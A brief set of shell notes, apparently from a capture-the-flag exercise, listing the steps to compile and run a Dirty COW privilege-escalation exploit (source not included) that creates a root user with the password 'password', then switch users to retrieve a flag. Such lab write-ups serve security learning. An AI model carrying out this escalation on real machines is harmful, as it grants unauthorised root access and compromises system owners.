cd /tmp

#Exploit linux vulnerability to become a root user
#Known as Dirty cow exploit

vim magic.c
gcc -pthread magic.c -o magic -lcrypt
./magic

#enter the password of the new root user -> password

#Wait for the magic to happen ...

su root_usr
password: "password"

su flag14
getflag
-> Gg wp
